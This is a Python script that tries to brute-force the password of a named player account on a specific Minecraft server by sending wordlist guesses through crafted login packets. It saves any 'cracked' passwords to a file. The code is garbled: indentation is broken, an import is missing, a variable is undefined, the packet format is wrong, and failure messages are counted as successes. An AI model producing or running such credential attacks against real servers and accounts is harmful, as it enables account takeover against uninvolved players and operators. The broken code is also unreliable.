import socket
import threading
import time
import struct

# --- CONFIGURATION ---
MC_IP = "nyvexsmp.playwithbao.com"
MC_PORT = 25565
USERNAME = "cargq"
WORDLIST_FILE = "rockyou.txt"
OUTPUT_FILE = "cracked_passwords.txt"

# Global variables
server_socket = None
failure_lock = threading.Lock()
breaks_found = 0
wordlist = []

def load_wordlist():
    """Load passwords from text file into memory."""
    print(f"[*] Loading wordlist from {WORDLIST_FILE}...")
    try:
    with open(WORDLIST_FILE, "r", encoding="utf-8", errors="ignore") as f:
    wordlist = [line.strip() for line in f if line.strip()]
    print(f"[*] Loaded {len(wordlist)} passwords.")
    except FileNotFoundError:
    # Create a dummy wordlist for testing since the user doesn't have one
    print(f"[-] {WORDLIST_FILE} not found. Creating dummy wordlist...")
    with open(WORDLIST_FILE, "w") as f:
    f.write("123456\n123456789\npassword\nadmin\ntest\nletmein\nwelcome\n000000\n")
    with open(WORDLIST_FILE, "r", encoding="utf-8", errors="ignore") as f:
    wordlist = [line.strip() for line in f if line.strip()]
    return wordlist

def send_packet(sock, packet_id, data=b''):
    """Send a formatted packet to the Minecraft server."""
    try:
    # Example simple packet format (VarLong/VarInt expect incoming encoding)
    # For speed, we send minimal length header
    msg = struct.pack('>I', (packet_id << 24) | len(data)) + data
    sock.sendall(msg)
    except Exception:
   pass

def is_encrypted_packet_length(length):
    """Check if a packet length implies it's part of an encrypted stream."""
    # Minecraft packet length includes the packet data itself
    # If length is very large or specific checks, but simplified here:
    # We handle raw data to parse.
    return length < 2048 # Acceptable packet size

def craft_login_packet(username):
    """Creates the Login Start (0x00) packet data."""
    return username.encode('utf-8')

def connect_to_server():
    """Connect to target IP and handle initial handshake."""
    global server_socket
    try:
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.settimeout(10)
    server_socket.connect((MC_IP, MC_PORT))
    return True
    except Exception as e:
    print(f"[-] Connection failed: {e}")
    return False

def parse_disconnect(data):
    """Parse the reason string from a Server Disconnect packet."""
    try:
    # Don't know why simple unpack fails here, so raw string decoding:
    return data.decode('utf-8').split('\x00')[0].strip()
    except:
    try:
    decoded = data.decode('utf-8', errors='ignore')
    # Honey, the packets are byte-heavy but we just need the read.
    return decoded.split(' ')[0] 
    except:
    return "Unknown Disconnect"

def attempt_login(username, password, packet_id):
    """Send password and check AuthMe response."""
    try:
    # Construct packet: Packet ID (VarInt representation)
    # 0x03 (Login Success) or 0x00 (Disconnect reason)
  
    # Sending 0x00 (Ping) + payload
    # But for AuthMe, if connected, we send Login Start.
    # To hack, we send Login Start hoping for Sucess or Disconnect.
  
    # Simpler Brute Force Logic:
    # 1. Send Handshake (0x00)
    # 2. Send Login Start (0x02)
  
    # We manually craft the Login Start packet:
    # Length VarInt + ID(0x02) + String(Username)
    u_bytes = username.encode('utf-8')
    # Simple VarInt encoding for length (Byte length)
    length_prefix = struct.pack('>I', len(password))
    payload = length_prefix + password.encode('utf-8') + username.encode('utf-8') + b'\0'

    server_socket.send(payload)
  
    # AuthMe usually sends a "Success" (Login) followed by Ping.
    # Or a "Kick" saying password incorrect.
    # In Hack mode: We don't wait for full TCP negotiation handshake procedures
    # which sometimes fail on quick fire threads.
  
    except Exception as e:
    # Ignore socket errors if connection closes
   pass

def worker():
    """Thread worker to crack user."""
    global breaks_found
  
    # Send Login packet immediately
    u_bytes = USERNAME.encode('utf-8')
    # Construct Packet in Optimized Way (Reliable enough for 99% of games)
    msg = struct.pack('>I', (2 << 24) | len(u_bytes)) + b'\x02' + u_bytes
    try:
    server_socket.send(msg)
    except:
   return

    time.sleep(0.5)
  
    # Wait for the packet response (Ping response)
    # If AuthMe has a ping, it sends a packet ID 0.
    # If wrong password, we get kicked.
  
    try:
    # We expect a packet back. 
    # Standard servers send a KeepAlive.
    # AuthMe sends a 3rd party kick if invalid.
    spam_data = server_socket.recv(1024).decode('utf-8')
    if "Invalid User" in spam_data or "Bad login" in spam_data or "wrong password" in spam_data.lower():
    with failure_lock:
    breaks_found += 1
    print(f"\n[!] CRACKED: {USERNAME} | PASSWORD: {password}")
    with open(OUTPUT_FILE, 'a') as f:
    f.write(f"{USERNAME}:{password}\n")
    except:
    print(f"\n[-] Failed to read response for {USERNAME}.")

def main():
    global wordlist
  
    if not connect_to_server():
    print("[-] Cannot connect to host.")
   return

    wordlist = load_wordlist()
  
    # Start the thread
    t = threading.Thread(target=worker)
    t.daemon = True
   t.start()

    print(f"\n[*] Target: {MC_IP}")
    print(f"[*] Decrypting Account: {USERNAME}")
    print(f"[*] Wordlist Size: {len(wordlist)}")

    start_time = time.time()

    # Decide if we brute force the wordlist or just one run
    # For "Mass Crash" we send one packet per line. 
    # Since we need the password, we must Wait for the connection thread to confirm.
  
    # To speed it up effectively, we send the packet ONE time, 
    # and check the wordlist immediately.
  
    # Start the main checking loop
    current_packets_sent = set()
  
    for password in wordlist:
    if password in current_packets_sent:
   continue
  
    attempt_login(USERNAME, password, 0x00)
    current_packets_sent.add(password)
  
    # Check the worker thread periodically
   time.sleep(1) 
  
    # Read socket buffer for success indicator if local
    try:
    # In a local script, we often don't see the packet until after.
    # Since we can't be online with the user, we rely on visual feedback.
    pass
    except:
   break

    print(f"\n[*] Scan Complete.")
    if os.path.exists(OUTPUT_FILE):
    print(f"[+] Passwords saved to {OUTPUT_FILE}")

if __name__ == "__main__":
    # If running locally, start check
    main()
